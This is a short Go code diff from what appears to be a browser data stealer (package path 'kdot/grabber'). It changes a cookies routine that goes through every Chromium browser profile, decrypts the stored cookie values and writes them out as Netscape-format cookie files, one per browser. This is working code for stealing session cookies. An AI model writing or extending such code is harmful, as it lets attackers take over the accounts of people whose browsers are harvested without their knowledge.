@@ -2,14 +2,21 @@ package cookies
 
 import (
 	"database/sql"
+	"os"
 
 	"kdot/grabber/browsers/chromium/structs"
 	"kdot/grabber/decryption"
 )
 
-func Get(browsersList []structs.Browser) string {
-	var cookies string
+type CookiesOutput struct {
+	browserName string
+	cookies     string
+}
+
+func GetTokensAuto(browsersList []structs.Browser) {
+	var cookies []CookiesOutput
 	for _, browser := range browsersList {
+		var cookiesFound = ""
 		for _, profile := range browser.Profiles {
 			path := profile.Cookies
 
@@ -45,9 +52,13 @@ func Get(browsersList []structs.Browser) string {
 				if host_key[0] == '.' {
 					tf_other = "FALSE"
 				}
-				cookies = cookies + host_key + "\t" + expired + "\t" + path_this + "\t" + tf_other + "\t" + expires_utc + "\t" + name + "\t" + decrypted + "\n"
+				cookiesFound = cookiesFound + host_key + "\t" + tf_other + "\t" + path_this + "\t" + name + "\t" + decrypted + "\t" + expired + "\n"
 			}
 		}
+		cookies = append(cookies, CookiesOutput{browser.ProfilePath, cookiesFound})
 	}
-	return cookies
+	for _, cookie := range cookies {
+		fileName := "cookies_netscape_" + cookie.browserName + ".txt"
+		os.WriteFile(fileName, []byte(cookie.cookies), 0644)
+	}
 }
